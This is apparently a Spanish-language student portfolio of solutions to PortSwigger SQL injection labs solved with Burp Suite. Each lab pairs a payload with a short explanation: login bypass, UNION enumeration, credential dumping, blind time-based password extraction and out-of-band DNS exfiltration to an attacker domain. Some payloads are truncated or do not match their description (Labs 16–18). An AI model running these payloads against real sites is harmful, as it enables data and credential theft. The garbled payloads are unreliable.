Los laboratorios de esta actividad fueron resueltos utilizando BURP SUITE, de PORTSWIGGER, esta herramienta funcionando como un interceptor y agresor para encontrar vulnerabilidades a las paginas de ejemplo, estas paginas siendo vulnerables a inyecciones SQL

La importancia de este portafolio es el estudio de los trabajos hechos despues de haber sido realizados en un futuro, mas aparte las lecciones aprendidas por nuestros errores en las actividades para mejorar como estudiantes.


Resolución de Laboratorios SQL Injection

Lab 01

SQL Injection en cláusula WHERE

La aplicación concatena directamente el parámetro category dentro de la consulta SQL. Esto permite modificar la lógica de la cláusula WHERE para mostrar todos los productos.
' OR 1=1--
El operador OR convierte la condición en verdadera y el comentario evita que se ejecute el resto de la consulta original.


Lab 02

SQL Injection Login Bypass

El formulario de autenticación construye la consulta SQL con los valores ingresados por el usuario. Un atacante puede cerrar la cadena del nombre de usuario y comentar la validación de contraseña.
administrator'--
El comentario elimina la comprobación del password permitiendo iniciar sesión como administrador.


Lab 03

UNION SQL Injection – Oracle

Se utiliza el operador UNION para combinar los resultados de la consulta original con datos del sistema Oracle.
' UNION SELECT banner, NULL FROM v$version--
La tabla del sistema v$version contiene la versión del motor de base de datos Oracle.


Lab 04

UNION SQL Injection – MySQL / MSSQL

Primero se identifica el número de columnas y luego se utiliza UNION SELECT para recuperar la versión del servidor.
'+UNION+SELECT+@@version,+NULL#
La variable @@version devuelve la versión del servidor MySQL o SQL Server.


Lab 05

UNION SQL Injection – Column Enumeration

Se determina el número de columnas de la consulta original utilizando valores NULL hasta evitar errores.
' UNION SELECT NULL,NULL--
El número de NULL debe coincidir con el número de columnas devueltas por la consulta original.


Lab 06

UNION SQL Injection – Text Column Detection

Una vez identificado el número de columnas se prueba cuáles permiten mostrar texto.
' UNION SELECT 'test','test'--
Si el texto aparece en la página significa que esa columna es vulnerable a extracción de datos.


Lab 07

UNION SQL Injection – Enumeración de tablas

Se consultan las tablas internas del sistema para descubrir la estructura de la base de datos.
' UNION SELECT table_name,NULL FROM information_schema.tables--
La tabla information_schema.tables contiene los nombres de todas las tablas de la base de datos.


Lab 08

UNION SQL Injection – Enumeración de columnas

Una vez identificada la tabla de usuarios se listan las columnas disponibles.
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
Permite identificar columnas como username y password.


Lab 09

UNION SQL Injection – Extracción de credenciales

Después de enumerar las columnas se recuperan las credenciales almacenadas en la base de datos.
' UNION SELECT username,password FROM users--
La consulta devuelve directamente los usuarios y contraseñas almacenados en la tabla.


Lab 10

Blind SQL Injection (Boolean-based)

La aplicación no muestra errores ni datos directamente, por lo que se utilizan condiciones booleanas.
' AND 1=1--
Se compara la respuesta cuando la condición es verdadera o falsa para confirmar la vulnerabilidad.


Lab 11

Blind SQL Injection – Enumeración de datos

Se utiliza una condición lógica para comprobar carácter por carácter información sensible.
' AND SUBSTRING(username,1,1)='a'--
Permite descubrir el contenido de una columna mediante inferencia.


Lab 12

Blind SQL Injection – Time Based

Se provoca un retraso en la respuesta del servidor cuando una condición es verdadera.
' AND SLEEP(5)--
Si la página tarda en responder se confirma la ejecución del payload en la base de datos.


Lab 13

Blind SQL Injection – Extracción por tiempo

Se combinan condiciones con funciones de retraso para descubrir información carácter por carácter.
' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)--
El tiempo de respuesta del servidor indica si la condición es verdadera.


Lab 14

Blind SQL Injection with Time Delay

Se explota una vulnerabilidad en la cookie TrackingId. Se inyecta una consulta que provoca un retraso en la respuesta del servidor usando pg_sleep() para confirmar la ejecución de SQL en PostgreSQL.
bhNp4lunWxP91zK6'+||+(SELECT pg_sleep(10))--
La comilla cierra la consulta original, el operador || concatena la nueva consulta y pg_sleep(10) provoca un retraso de 10 segundos, confirmando la vulnerabilidad.


Lab 15

Blind SQL Injection with Time Delay & Information Retrieval

Se utiliza una inyección SQL ciega basada en tiempo para obtener la contraseña del usuario administrador carácter por carácter mediante el uso de condiciones.
' || (SELECT CASE WHEN (username='administrator' AND substring(password,1,1)='a') THEN pg_sleep(2) ELSE pg_sleep(-1) END FROM users)--
Si la condición es verdadera, el servidor se retrasa 2 segundos. Esto permite identificar cada carácter de la contraseña usando herramientas como Burp Intruder.


Lab 16

Blind SQL Injection Out-of-Band (OAST)

Se explota la vulnerabilidad para provocar una interacción externa mediante DNS utilizando Burp Collaborator.
'+UNION SELECT extractvalue( xmltype(' %remote;]>'),'/l') FROM dual--
Se usa la función extractvalue() de Oracle para forzar una solicitud HTTP externa al dominio del atacante, confirmando la ejecución de la consulta.


Lab 17

Out-of-Band Data Exfiltration

Similar al laboratorio anterior, pero aquí se exfiltran datos sensibles (contraseña del administrador) a través de consultas DNS.
'+UNION SELECT extractvalue( xmltype(' %remote;]>'),'/l') FROM dual--
La contraseña se concatena en el subdominio solicitado al servidor del atacante, permitiendo recuperar los datos mediante registros DNS.


Lab 18

SQL Injection Bypass via XML Encoding

La aplicación filtra palabras clave como SELECT o UNION, pero no detecta entidades XML codificadas.
1 UNION SELECT username, password FROM users
Las palabras clave están codificadas en hexadecimal XML, lo que permite evadir el filtro de seguridad mientras la base de datos las interpreta correctamente.
